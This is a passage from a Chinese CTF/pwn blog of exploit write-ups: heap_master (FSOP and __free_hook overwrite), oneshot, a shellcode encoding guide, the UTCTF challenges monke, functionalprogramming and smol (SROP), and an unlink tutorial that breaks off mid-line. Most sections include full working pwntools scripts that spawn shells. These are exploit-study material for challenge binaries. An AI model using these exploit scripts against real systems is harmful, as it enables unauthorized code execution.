change_cont。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs1-2.png)\n\n(2)delete函数：同样输入偏移针对m_chunk_addr对应偏移free，由于没有指针的相关操作，所以这里存在UAF。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs2-2.png)\n\n# 3.漏洞解析：\n\n(1)由于mmap的数据可以任意伪造和释放，那么我们可以利用这个释放任意大小chunk，在没有办法泄露地址的情况下，我们可以选择进行爆破global_max_fast，利用unsortedbin attack在global_max_fast上写下main_arena地址，使得fastbinY数组可以越界写。\n\n(2)之后再利用释放任意大小的chunk，从main_arena中fastbinY数组越界往后写，修改_IO_2_1_stout结构体的_IO_write_base、_IO_write_ptr、_IO_read_end、_IO_write_end为mmap中放入unsortedbin的堆地址，从而泄露出main_arena地址得到地址。\n\n(3)再利用fastbin的特性，修改fastbinY数组上的chunk的fd为system，申请对应大小的fastbin回来之后，其fd就留在fastbinY数组上，这样如果fastbinY对应的那个索引chunk本身就在free_hook上，那么就可以修改free_hook为system了。这个同样通过fastbinY数组越界写来实现。\n\n(4)最后释放一个/bin/sh堆块即可getshell。\n\n# 4.exp编写与调试：\n\n(1)首先是菜单函数：\n\n```python\n#注释头\n\ndef dbg():\n    gdb.attach(io)\n    pause()\n    \n\ndef add(size):\n    io.sendlineafter(\">> \", \"1\")\n    sleep(0.01)\n    io.sendlineafter(\"size: \", str(size))\n    sleep(0.01)\n\ndef edit(offset, cont):\n    io.sendlineafter(\">> \", \"2\")\n    sleep(0.01)\n    io.sendlineafter(\"offset: \", str(offset))\n    sleep(0.01)\n    io.sendlineafter(\"size: \", str(len(cont)))\n    sleep(0.01)\n    io.sendafter(\"content: \", cont)\n    sleep(0.01)\n\ndef m_edit(offset, cont):\n    io.sendline(\"2\")\n    sleep(0.01)\n    io.sendline(str(offset))\n    sleep(0.01)\n    io.sendline(str(len(cont)))\n    sleep(0.01)\n    io.send(cont)\n    sleep(0.01)\n\ndef delete(offset):\n    io.sendlineafter(\">> \", \"3\")\n    sleep(0.01)\n    io.sendlineafter(\"offset: \", str(offset))\n    sleep(0.01)\n\ndef m_delete(offset):\n    io.sendline(\"3\")\n    sleep(0.01)\n    io.sendline(str(offset))\n    sleep(0.01)\n```\n\n这里切分m_delete和m_edit的原因是因为在后面第一次修改_IO_write_base之后输出的东西可能就会发生一些变化，不太好接着判断。\n\n(2)修改global_max_fast：\n\n```python\n#注释头\n\nedit(0,p64(0x0)+p64(0x91)+\n    '0'*0x80+\n    p64(0x0)+p64(0x21)+\n    '1'*0x10+\n    p64(0x0)+p64(0x21))\ndelete(0x10)\nguess = 0x9000\nedit(0x18, p16((guess + libc.sym['global_max_fast'] - 0x10) & 0xffff))\nadd(0x80)\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-11_14-40-07.png)\n\n(3)fastbinY数组越界写，泄露得到地址：\n\n```python\n#注释头\n\nfastbinsY = guess + libc.sym['main_arena'] + 8\n_IO_read_end = guess + libc.sym['_IO_2_1_stdout_'] + 0x10\n_IO_write_base = guess + libc.sym['_IO_2_1_stdout_'] + 0x20\n_IO_write_ptr = guess + libc.sym['_IO_2_1_stdout_'] + 0x28\n_IO_write_end = guess + libc.sym['_IO_2_1_stdout_'] + 0x30\n\n\n\n# overwrite _IO_2_1_stdout_._IO_write_base\nidx = (_IO_write_base - fastbinsY) / 8\nsize = idx * 0x10 + 0x20\nm_edit(0x10 + 0x8, p64(size+1))\nm_edit(0x10 + size, p64(0x0)+p64(0x21))\nm_delete(0x10 + 0x10)\n\n\n# overwrite _IO_2_1_stdout_._IO_write_ptr\nidx = (_IO_write_ptr - fastbinsY) / 8\nsize = idx * 0x10 + 0x20\nm_edit(0x10 + 0x8 + 0x10, p64(size+1))\nm_edit(0x10 + size + 0x10, p64(0x0)+p64(0x21))\nm_delete(0x10 + 0x10 + 0x10)\n\n\n# overwrite _IO_2_1_stdout_._IO_write_end\nidx = (_IO_write_end - fastbinsY) / 8\nsize = idx * 0x10 + 0x20\nm_edit(0x10 + 0x8 + 0x10, p64(size+1))\nm_edit(0x10 + size + 0x10, p64(0x0)+p64(0x21))\nm_delete(0x10 + 0x10 + 0x10)\n\n\n# overwrite _IO_2_1_stdout_._IO_read_end\nidx = (_IO_read_end - fastbinsY) / 8\nsize = idx * 0x10 + 0x20\nm_edit(0x10 + 0x8, p64(size+1))\nm_edit(0x10 + size, p64(0x0)+p64(0x21))\nm_delete(0x10 + 0x10)\n\n\nlibc_base= u64(io.recvuntil(\"\\x7f\")[-6: ] + '\\0\\0') - libc.sym['main_arena'] - 88\nlog.info(\"libc_base:0x%x\"%libc_base)\n__free_hook = libc_base + libc.sym['__free_hook'] \nfastbinsY = libc_base + libc.sym['main_arena'] + 8 \nsystem_addr = libc_base + libc.sym['system']\n```\n\nmmap为0x4a0fe000\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-11_14-51-03-1.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-11_14-51-32.png)\n\n四个均修改过了，这种情况下flag不修改也是可以泄露的。\n\n▲其实这个只写write_base和read_end也可以，只不过会发送特别多的数据过来，打远程的时候很不好打。需要注意的是read_end得最后写。\n\n(4)越界释放chunk到_free_hook，然后修改其fd为system，再申请回来就可以将_free_hook改为system。\n\n```python\n#注释头\n\n# fake fastbin fd to system\nidx = (__free_hook - fastbinsY) / 8\nsize = idx * 0x10 + 0x20\nlog.info(\"size:0x%x\"%size)\nedit(0x10 + 8, p64(size+1))\nedit(0x10 + size, p64(0x0)+p64(0x21))\ndelete(0x10 + 0x10)\nedit(0x20, p64(system_addr))\nadd(size - 0x10)\n```\n\n没有申请回来之前，free_hook上是堆地址，其FD为system\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs1-3.png)\n\n申请回来之后，FD被写进free_hook，这是fastbin机制造成的。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs2-3.png)\n\n(5)创建/bin/sh堆块，释放即可getshell：\n\n```python\n#注释头\n\nedit(0x200, p64(0x0)+p64(0x21)+\"/bin/sh\\0\")\ndelete(0x200 + 0x10)\nio.interactive()\n```\n\n# 5.总的爆破EXP：\n\n```python\n#注释头\n\n#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nfrom pwn import *\nfrom time import sleep\nimport os\ncontext.binary = \"./heap_master\"\nlibc = ELF(context.binary.libc.path)\n\n\ndef dbg():\n    gdb.attach(io)\n    pause()\n    \n\ndef add(size):\n    io.sendlineafter(\">> \", \"1\")\n    sleep(0.01)\n    io.sendlineafter(\"size: \", str(size))\n    sleep(0.01)\n\ndef edit(offset, cont):\n    io.sendlineafter(\">> \", \"2\")\n    sleep(0.01)\n    io.sendlineafter(\"offset: \", str(offset))\n    sleep(0.01)\n    io.sendlineafter(\"size: \", str(len(cont)))\n    sleep(0.01)\n    io.sendafter(\"content: \", cont)\n    sleep(0.01)\n\ndef m_edit(offset, cont):\n    io.sendline(\"2\")\n    sleep(0.01)\n    io.sendline(str(offset))\n    sleep(0.01)\n    io.sendline(str(len(cont)))\n    sleep(0.01)\n    io.send(cont)\n    sleep(0.01)\n\ndef delete(offset):\n    io.sendlineafter(\">> \", \"3\")\n    sleep(0.01)\n    io.sendlineafter(\"offset: \", str(offset))\n    sleep(0.01)\n\ndef m_delete(offset):\n    io.sendline(\"3\")\n    sleep(0.01)\n    io.sendline(str(offset))\n    sleep(0.01)\n\ndef pwn():\n    global io\n    edit(0,p64(0x0)+p64(0x91)+\n        '0'*0x80+\n        p64(0x0)+p64(0x21)+\n        '1'*0x10+\n        p64(0x0)+p64(0x21))\n    delete(0x10)\n    guess = 0x9000\n    edit(0x18, p16((guess + libc.sym['global_max_fast'] - 0x10)&0xffff))\n    add(0x80)\n\n\n    fastbinsY = guess + libc.sym['main_arena'] + 8\n    _IO_read_end = guess + libc.sym['_IO_2_1_stdout_'] + 0x10\n    _IO_write_base = guess + libc.sym['_IO_2_1_stdout_'] + 0x20\n    _IO_write_ptr = guess + libc.sym['_IO_2_1_stdout_'] + 0x28\n    _IO_write_end = guess + libc.sym['_IO_2_1_stdout_'] + 0x30\n    __free_hook = guess + libc.sym['__free_hook']\n    _IO_list_all = guess + libc.sym['_IO_list_all']\n\n    # overwrite _IO_2_1_stdout_._IO_write_base\n    idx = (_IO_write_base - fastbinsY) / 8\n    size = idx * 0x10 + 0x20\n    m_edit(0x10 + 0x8, p64(size+1))\n    m_edit(0x10 + size, p64(0x0)+p64(0x21))\n    m_delete(0x10 + 0x10)\n\n\n    # overwrite _IO_2_1_stdout_._IO_write_ptr\n    idx = (_IO_write_ptr - fastbinsY) / 8\n    size = idx * 0x10 + 0x20\n    m_edit(0x10 + 0x8 + 0x10, p64(size+1))\n    m_edit(0x10 + size + 0x10, p64(0x0)+p64(0x21))\n    m_delete(0x10 + 0x10 + 0x10)\n\n    # overwrite _IO_2_1_stdout_._IO_write_end\n    idx = (_IO_write_end - fastbinsY) / 8\n    size = idx * 0x10 + 0x20\n    m_edit(0x10 + 0x8 + 0x10, p64(size+1))\n    m_edit(0x10 + size + 0x10, p64(0x0)+p64(0x21))\n    m_delete(0x10 + 0x10 + 0x10)\n\n\n    # overwrite _IO_2_1_stdout_._IO_read_end\n    idx = (_IO_read_end - fastbinsY) / 8\n    size = idx * 0x10 + 0x20\n    m_edit(0x10 + 0x8, p64(size+1))\n    m_edit(0x10 + size, p64(0x0)+p64(0x21))\n    m_delete(0x10 + 0x10)\n\n    libc_base= u64(io.recvuntil(\"\\x7f\")[-6: ] + '\\0\\0') - libc.sym['main_arena'] - 88\n    log.info(\"libc_base:0x%x\"%libc_base)\n    __free_hook = libc_base + libc.sym['__free_hook']\n    fastbinsY = libc_base + libc.sym['main_arena'] + 8\n    system_addr = libc_base + libc.sym['system']\n\n\n    # fake fastbin fd to system\n    idx = (__free_hook - fastbinsY) / 8\n    size = idx * 0x10 + 0x20\n    log.info(\"size:0x%x\"%size)\n    edit(0x10 + 8, p64(size+1))\n    edit(0x10 + size, p64(0x0)+p64(0x21))\n    delete(0x10 + 0x10)\n    edit(0x20, p64(system_addr))\n    #dbg()\n    add(size - 0x10)\n    #pause()\n\n    edit(0x200, p64(0x0)+p64(0x21)+\"/bin/sh\\0\")\n    delete(0x200 + 0x10)\n\n    io.interactive()\n\n\n\ni = 0\nwhile True:\n    i += 1\n    print i\n    io = process(\"./heap_master\")\n    try:\n        pwn()\n        io.recv(timeout = 1) \n        #要么崩溃要么爆破成功，若崩溃io会关闭，io.recv()会触发   EOFError\n    except EOFError:\n        io.close()\n        continue\n    else:\n        # sleep(0.1)\n        # io.sendline('/bin/sh\\x00')\n        # sleep(0.1)\n        # io.interactive() #没有EOFError的话就是爆破成功，可以开shell\n        break\n```\n\n# 6.总结：\n\n(1)unsortedbin attack：修改bk任意写main_arena，这里bk通常可以进行部分写来爆破，也常常用来修改global_max_fast，使得fastbinY越界写。\n\n(2)FSOP的利用中，不一定非得修改flag，修改_IO_write_base、_IO_write_ptr、_IO_read_end、_IO_write_end也可以，其中需要满足_IO_read_end等于_IO_write_base来起到flag的作用绕过检查。\n\n(3)fastbinY数组的越界申请，修改其fd可实现任意写，这点和利用fastbinY数组中chunk大小在main_arena中留下0x20~0x80的数据异曲同工。","tags":["Heap-Skill"],"categories":["PWN","pwn堆-刷题技巧"]},{"title":"TJCTF 2016-oneshot","url":"/2021/08/14/TJCTF 2016-oneshot/","content":"\n \n\n1.常规checksec，只开了NX，然后IDA打开找漏洞。发现找不到什么漏洞，但是有个很奇怪的地方\n\n```\n#注释头\n\n__int64 (__fastcall *v4)(const char *); // [rsp+8h] [rbp-8h]\n---------------------------------------------------------------------------\n__isoc99_scanf(\"%ld\", &v4);\n-------------------------------------------------------------------------\nreturn v4(\"Good luck!\");\n```\n\n查看反汇编代码后发现会有这么一串代码，v4是我们输入的东西，却被以函数形式调用。在汇编窗口中看下，发现call puts函数之后的代码形式是这样的。\n\n```\n#注释头\n\nvar_8 = qword ptr -8\n--------------------------------------------------------\nmov  rax, [rbp+var_8]\nmov  rdx, rax\nmov  eax, 0\ncall rdx\n```\n\n也就是把我们输入的保存在var_8里的内容，给了rax,rax又给了rdx，之后call rdx。也就是我们输入的东西最后会被当初代码指令来执行。\n\n2.程序不存在栈溢出，输入只能是4个字节，已经规定好了。%ld代表long int，四个字节，程序又没有一次getshell的后门函数，所以就只能靠这4个字节来getshell。\n\n3.这里考虑使用one gadget RCE来一步getshell，首先在Linux下查找一下题目给的libc中有没有onegadget:\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191550001.jpeg)\n\n4.这样就可以通过一次跳转来getshell，但是第一条有限制条件，由于汇编代码中在call rdx之前有mov eax,0;即rax就等于0。(eax在64位程序下就是rax的低32位)或者先调试看看能不能满足条件，经过调试发现执行到call rdx时rax = 0，也满足要求，那么就尝试写payload。\n\n5.本地中首先需要连接到指定的库文件中，可以先在linux中ldd libc库文件来看题目给的库文件是什么版本，之后修改这段代码让process能够连接到指定版本的libc文件。(利用pwndocker，或者自己下个对应版本的ubuntu—docker，然后安装python之类的)\n\nio = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './tvstation'], env={\"LD_PRELOAD\":\"./libc.so.6_x64\"})\n\n6.由于不知道onegadget被libc加载进入之后是在什么地址，所以现在还需要泄露一个地址，刚好程序中有两个isoc99_scanf，第一个可以用来输入某个函数.got表中onegadget的地址，然后程序会打印出来该函数真实地址，对应代码为：\n\n```\n#注释头\n\n__isoc99_scanf(\"%ld\", &v4);\nprintf(\"Value: 0x%016lx\\n\", *(_QWORD *)v4);\n```\n\n但注意输入的格式。由于输入格式为__isoc99_scanf(\"%ld\", &v4)中的ld，也就是十进制有符号长整型，(l=long型，d=Decimal也就是十进制)所以我们需要将该地址转化为十进制数然后输入，因为scanf格式规定了，之后打印的格式是%016lx，其中x代表Hexadecimal，也就是16进制，16代表总共输出16位，0代表不足16位则高位补零。(如果不知道可以拿visualstudio测试一下就可以)\n\n7.所以第一次输入应该为某个函数地址对应的十进制，这里选取setbuf函数，因为setbuf函数刚好在.got.plt表中，同时也从外部引用，在extern也有，十六进制地址为：0x600ae0(这里选用puts,printf,甚至__libc_start_main也行，只要满足在.got.plt表中和extern表中)也就是6294240，即io.sendline(“6294240”)。这样就可以打印出setbuf函数被加载进内存的地址，之后获取这个地址，先接收io.recvuntil(\"Value: \")，使得接下来打印的是setbuf的内存地址，之后使用\n\nsetbuf_memory_addr = int(io.recv()[:18], 16)\n\n表示总共接收18个字符，之后以16进制形式转化位int，10进制形式。这里总共应该会打印18个字符，16+0x，也就是18个。\n\n8.之后计算偏移量，得到one_gadget_rce在内存中的地址即可：注意要转化为str字串形式发送\n\nio.sendline(str(setbuf_memory_addr - (setbuf_addr_libc - one_gadget_rce_libc)))\n\n9.最后io.interactive()即可getshell。\n\n \n\n参考资料：\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["ROP"],"categories":["PWN","ROP0x3"]},{"title":"Shellcode汇总","url":"/2021/08/14/ShellCode汇总/","content":"\n一、shellcode的查找和获取：\n\n1.地址：http://shell-storm.org/shellcode/\n\n2.获取方式：可以通过linux/x86/sh/bash/execve/shellcode等等关键词来查找\n\n \n\n二、shellcode的编码：\n\n示例：\n\n```\n#注释头\n\npython -c 'import sys; sys.stdout.write(\"\\x31\\xc9\\xf7\\xe1\\xb0\\x0b\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80\")' | msfvenom -p - -e x86/alpha_mixed -a linux -f raw -a x86 --platform linux BufferRegister=EAX -o payload\n```\n\n1.’import sys; sys.stdout.write(“shellcode”)’：这是导入包之后写入编码的shellcode。\n\n2.由于msfvenom只能从stdin中读取，所以使用Linux管道符”|”来使得shellcode作为python程序的输出。\n\n3.此外配置编码器为x86/alpha_mixed，配置目标平台架构等信息，输出到文件名为payload的文件中。\n\n4.Shellcode的执行条件一般都是call Register，这里的BufferRegister设置是因为通过指令call eax调用shellcode,所以配置BufferRegister=EAX。最后即可在payload中看到对应的被编码后的代码。\n\n \n\n三、shellcode的两段执行：\n\n1.需要泄露RWX段的地址，读取泄露地址：\n\n2.需要跳转jmp命令或者是return/call，但是return会pop eip，call会push eip，都会修改掉栈中的内容。如果shellcode的两段执行计算偏移地址的话，可能需要将这两个内容也计算进入。但是jmp就不会需要，是直接无条件跳转，所以大多时候选择jmp比较好。\n\n \n\n \n","tags":["Fmstr"],"categories":["PWN","Shellcode0x2"]},{"title":"UTCTF赛后复现","url":"/2021/08/14/UTCTF赛后复现/","content":"\n这次比赛做了两道题之后就没怎么看了，忙其他的去了。这里主要复现一下另一道题，monke。做这道题的时候估计脑子抽风了，居然没看还有一个隐藏选项在IDA中明明白白地显示着，自己居然没发现，导致啥漏洞都找不出来。\n\n一、MONKE复现：\n\n1.常规IDA，checksec一下，只开了NX。漏洞点在Free模块和隐藏选项：\n\nFree模块\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191457777.png)\n\n隐藏选项：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191457778.png)\n\n可以看到当free的时候，会对can_eat这个全局变量进行判断：\n\n```\n//注释头\n\n\ncan_eat默认为1\n------------------------------------------------------------------------------\nif ( can_eat )\n    inventory[edit_idx] = 0LL;\n```\n\n如果为1，则将指针置零，否则就不置零。这样就会造成管理banana的inventory[idx]指针悬空，再加上选项2可以rename修改内容，直接造成UAF漏洞。同时，由于这里是通过结构体inventory来管理banana，结构体如下：\n\n```\n//注释头\n\n00000000 inventory struc ; (sizeof=0x10, mappedto_4)\n00000000 banana dq ?\n00000008 name_size dq ?\n00000010 inventory ends\n```\n\n打印内容的时候是通过inventory[idx]->banana来打印的，所以如果我们可以把banana的指针指向got表，那么就可以打印出got表中函数的真实地址，从而泄露出libc基地址，这样通过libc基地址和UAF漏洞直接劫持free函数，构造system(\"/bin/sh\")即可。\n\n▲思考如何将banana指针指向got表：漏洞点同样也在free函数，由于在malloc时会申请一个0x20大小的chunk来存放banana的地址和size，用来管理banana。但是在free的时候却没有free掉这个0x20大小的chunk。\n\n(1)先申请一个0x20大小的banana0，进入隐藏选项，然后free掉，banana0进入tcache中，但是inventory[0]并没有被置0。\n\n(2)再申请一个0x20大小的banana1，将banan0申请回来，这时管理banana1的chunk就变成了banan0，这样就可以通过inventory[0]来修改banan0从而修改管理banan1的chunk，使得原本指向banan1的指针指向free的got表。\n\n(3)之后再通过选项2，就可以打印inventory[0].banana1的内容，也就是free的got表中的真实地址。\n\n2.开始编写exp:\n\n(1)首先泄露基地址：\n\n```\n#注释头\n\nfind_banana(\"a\", 4)\n\n#跳转至隐藏选项，将can_eat置零。\nwalk(\"0\")\n\n#吃掉香蕉，使得banana0进入tcache中，方便之后申请回来，同时inventory[0]没有置零。\neat(0)\n\n#申请banana1，将banana0申请回来，使得管理banana1的chunk变成banana0，方便之后修改。\nfind_banana(\"b\", 8)\n\n#将*(inventory[0].banana)修改为free的got表\nrename(0, p64(elf.got[\"free\"]))\nsh.sendline(\"s\")\nskip_menu()\n\n# 展示inventory，从inventory[0].banana对应的内存上泄露地址\nsh.sendline(\"2\")\nsh.recvline()\nsh.recvline()\nfree = u64(sh.recvline()[3:].strip().ljust(8, b\"\\x00\"))\n\n#计算得到libc基地址：\nlibc.address = free - libc.symbols[\"free\"]\nlog.info(f\"libc base leaked @ 0x{libc.address:x}\")\n```\n\n(2)劫持free函数为system函数：\n\n```\n#注释头\n\n#此时inventory[1].banana的值应该是free的got表，那么此时修改\n#inventory[1].banana.content就会直接修改free的got表，从而劫持函数\nsh.sendline(\"1\")\nsh.recvline()\nsh.sendline(\"rename\")\nsh.recvline()\nsh.sendline(p64(libc.symbols[\"system\"]))\n```\n\n(3)再申请一个内容为/bin/sh字符串的chunk，释放掉即可getshell：\n\n```\n#注释头\n\nfind_banana(\"/bin/sh\", 10)\neat(2, True)\nsh.interactive()\n```\n\n(4)前置函数：\n\n```\n#注释头\n\nelf = ELF(\"./monke\")\nlibc = ELF(\"./libc-2.27.so\")\nsh = elf.process()\n#sh = remote(\"pwn.utctf.live\", 9999)\n\n\ndef skip_menu():\n    global sh\n    sh.recvuntil(\"2: inventory\\n\")\n    return bool(sh.recvline(timeout=0.5))\n\ndef walk(where=\"s\"):\n    global sh\n    sh.sendline(\"0\")\n    sh.sendlineafter(\"[n|s|e|w]\", where)\n    return skip_menu()\n\n\ndef find_banana(name, length):\n    global sh\n    while not walk():\n        pass\n    sh.sendline(\"3\")\n    sh.sendlineafter(\"How long would you like the name to be:\", str(length))\n    sh.sendlineafter(\"What would you like to name it:\", name)\n    skip_menu()\n\n\ndef eat(idx, end = False):\n    sh.sendline(\"2\")\n    sh.recvline()\n    while bool(sh.recvline(timeout=0.5)):\n        pass\n    sh.sendline(str(idx))\n    sh.recvline()\n    sh.sendline(\"eat\")\n    sh.recvline()\n    if not end:\n        skip_menu()\n\ndef rename(idx, name):\n    sh.sendline(\"2\")\n    sh.recvline()\n    while bool(sh.recvline(timeout=0.5)):\n        pass\n    sh.sendline(str(idx))\n    sh.recvline()\n    sh.sendline(\"rename\")\n    sh.recvline()\n    sh.sendline(name)\n    skip_menu()\n```\n\n \n\n二、functionalprogramming：\n\n1.常规IDA，checksec分析，RELRO没开。程序本身很简单，输入function，parameter和element可以构造一个函数，然后调用。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191457785.png)\n\n2.然后程序运行过程中会泄露出libc地址和，直接从网站https://libc.blukat.me/来找版本，或者使用其他工具也可以，利用泄露出来的abs函数地址，即可得知libc版本为libc6_2.23-0ubuntu11.2_amd64。\n\n3.然后根据程序，即可构造system(\"/bin/sh\")，或者利用onegadget也可以，这里直接贴exp吧。\n\n```\n#!/usr/bin/python\n#coding:utf-8\n\nfrom pwn import *\nio = remote('pwn.utctf.live',5433)\n#io = process('./functionalprogramming')\nonegadget = 0xf0364\n\nio.sendline('1')\nio.sendline('1')\nio.recvuntil(\"Abs: \")\nlibc_abs = int(io.recv()[2:14],16)\nlibc_base = libc_abs-0x3a640\nlog.info('libc_abs:%x'%libc_abs)\nlog.info('libc_base:%x'%libc_base)\nio.sendline('1')\n\n#io.sendline('1')\npayload = \"\"\npayload += hex(libc_base+onegadget)\npayload = payload.replace('0x','')\n\nio.send(payload)\nio.interactive()\n```\n\n \n\n三、Smol复现：\n\n1.没啥好分析的，栈溢出漏洞，什么保护都没开，存在BSS段，常规SROP，利用栈劫持到BSS段，懂的都懂。\n\n2.直接贴exp:\n\n```\n#!/usr/bin/python\n#coding:utf-8\n\nfrom pwn import *\ncontext.update(os = 'linux', arch = 'amd64')\nio = remote(\"pwn.utctf.live\",9998)\n\npayload = \"\"\npayload += p64(0x402000+0x10)\npayload += p64(0x402000+0x10) #addr 0x402008\npayload += p64(0x401015) #rsp = 0x402020\nio.send(payload)\n\nframe_execve = SigreturnFrame() #设置execve的SROP帧，注意计算/bin/sh\\x00所在地址\nframe_execve.rax = constants.SYS_execve\nframe_execve.rdi = 0x402008\nframe_execve.rip = 0x40103D #syscall_addr\n\npayload2 = \"\"\npayload2 += \"/bin/sh\\x00\"        #0x402008\npayload2 += p64(0x402000+0x10)   #0x402010\npayload2 += p64(0x401015)        #0x402018\npayload2 += p64(0x402000+0x30)   #0x402020\npayload2 += \"A\"*0x10             #0x402028\npayload2 += p64(0x40103D)\npayload2 += str(frame_execve)    #0x402038\nio.send(payload2)\n\n#buf = 0x402008\n#rsp = 0x402020\n#rbp = 0x402010 ->0x402010\n\npayload3 = payload2[0:8]\npayload3 += \"\\x30\\x20\\x40\\x00\\x00\\x00\\x00\"\nio.send(payload3)\n\nio.interactive()\n```\n\n但是这里调试了好一段时间，需要再仔细分析一点，下回争取早点解决类似的题目。\n\n \n\n \n","tags":["比赛"],"categories":["PWN"]},{"title":"axb_2019_heap-unlink","url":"/2021/08/14/axb_2019_heap-unlink/","content":"\n1.最开始看源码，感觉还行，能看懂，但是一旦看其他人讲unlink，感觉完全对不上，分明就是瞎搞，之后调试才发现单独的unlink攻击并不是针对chunk的，而是针对具体题目的结构体的。并且要求程序可以修改掉chunk的size位，执行向上合并从而触发unlink。\n\n2.unlink攻击流程如下：\n\n(1)找到题目中的chunklist位置，并分清结构体中是size在前还是chunk在前。\n\n(2)这里假设我们想要控制chunklist[0]中的chunk。申请chunk0,chunk1,chunk2。在chunk0中构造fakechunk，并设置：\n\n```\n#注释头\n\nfakechunk->fd = chunklist_addr-0x18\nfakechunk->bk = chunklist_addr-0x10\n```\n\n(3)通过堆溢出或者off-by-one将chunk1的pre_size设置成fakechunk_size，将chunk1的size设置成fakechunk_size+chunk1_size。\n\n(4)free掉chunk1，这样就会触发向上合并，将fakechunk和chunk1合并。同时，由于合并过程中调用了unlink函数，那么chunklist[0].chunk就会指向chunlist_addr-0x18，对应的就是我们的chunk0指向chunklist_addr-0x18。\n\n▲unlink源码：\n\n```\n#注释头\n\nFD = P->fd;\nBK = P->bk;\nif (__builtin_expect (FD->bk != P || BK->fd != P, 0))\nmalloc_printerr (check_action, \"corrupted double-linked list\", P, AV);\nFD->bk = BK;\nBK->fd = FD;\n```\n\nA.首先通过fakechunk，也就是p，找到前一个chunk和后一个chunk:\n\n```\n#注释头\n\nFD = P->fd;\nBK = P->bk;\n```\n\n这里的FD和BK分别为fakechunk的前一个chunk和后一个chunk，也就是chunklist_addr-0x18和chunklist_addr-0x10。\n\nB.然后过检查：\n\n```\n#注释头\n\nif (__builtin_expect (FD->bk != P || BK->fd != P, 0)) malloc_printerr (check_action, \"corrupted double-linked list\", P, AV);\n```\n\n能过检查的原因就是因为FD->bk就相当于是[chunklist_addr-0x18]+[0x18]，就相当于chunklist_addr，也就是chunklist[0].chunk。而该地址中保存的内容就是fakechunk_addr。\n\n注意chunk0_addr和fakechunk_addr不是一样的，因为有chunk结构的原因，如下图，可以看到实际上chunklist[n].chunk保存的值是chunk数据部分的地址，在这里也就相当于是fakechunk_addr。所以也就能过检查。同理BK->fd相当于是[chunklist_addr-0x10]+[0x10]，等于chunklist_addr，该地址中保存的值就是fakechunk_addr。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191533541.jpeg)\n\nC.过完检查之后，就来到赋值部分\n\n```\n#注释头\n\nFD->bk = BK;\nBK->fd = FD;\n```\n\n那么现在FD->bk = BK相当于[chunklist_addr-0x18]+[0x18]，也就是chunklist_addr中的值被赋值为chunklist_addr-0x10，之后BK->fd = FD，就是chunklist_addr中的值被赋值为chunklist_addr-0x18，所以总的来说，chunklist[0].chunk会指向chunklist_addr-0x18，也就是说我们的fakechunk指向chunklist_addr-0x18，这样就相当于可以通过修改fakechunk就可以修改chunklist这个bss段上的内容。而fakechunk又是chunk0的数据部分，完全在我们的掌控范围。\n\n(5)现在修改chunk0数据就先当于修改chunklist这个bss段上的内容。\n\n3.在这道题中，原本chunklist[0].chunk中保存的值是fakechunk_addr，我们可以修改chunklist[0].chunk中保存的值为free_hook地址，那么之后再修改chunk0数据部分就相当于修改free_hook中的内容了。那么现在就可以将free_hook保存的值修改为system的真实地址，这样在free时就相当于调用system函数，那么一旦free某个chunk，而该chunk的数据部分为binsh字符串，那么就相当于调用system(\"/bin/sh\")，从而getshell.\n\n4.现在开始分析这道题目，get_input函数中存在off-by-one，banner()函数中存在格式化字符串漏洞：\n\nget_input:\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191533283.jpeg)\n\nbanner:\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191533339.jpeg)\n\n利用格式化字符漏洞泄露Libc从而得到其它所有地址。之后通过off-by-one进行unlink攻击，构造fakechunk到chunklist这个Bss段上，修改chunklist段上的chunklist[0].chunk，使其指向free_hook_addr。之后再通过修改chunk0从而修改free_hook为system真实地址，再申请某个数据部分为binsh字符串的chunk，释放掉就能getshell。\n\n总exp如下：\n\n(1)首先增删改查函数：\n\n```\n#注释头\n\ndef add(index,size,content):\n    p.sendlineafter('>> ','1')\n    p.sendlineafter('Enter the index you want to create (0-10):',str(index))\n    p.sendlineafter('Enter a size:',str(size))\n    p.sendlineafter('Enter the content:',content)\n\ndef free(index):\n    p.sendlineafter('>> ','2')\n    p.sendlineafter('Enter an index:',str(index))\n\ndef edit(index,content):\n    p.sendlineafter('>> ','4')\n    p.sendlineafter('Enter an index:',str(index))\n    p.sendafter('Enter the content:',content)\n```\n\n(2)利用格式化字符漏洞泄露栈上的__libc_main和main地址：\n\n```\n#注释头\n\np.sendline('%11$p%15$p')\np.recvuntil('Hello,')\nbase = hex(int(p.recv(14),16)-0x116a - 28)\nlibcbase = hex(int(p.recv(14),16) - 240 - libc.sym['__libc_start_main'])\nchunklist = hex(base + 0x202060)\nfree_hook = libcbase + libc.sym['__free_hook']\nsystem = libcbase + 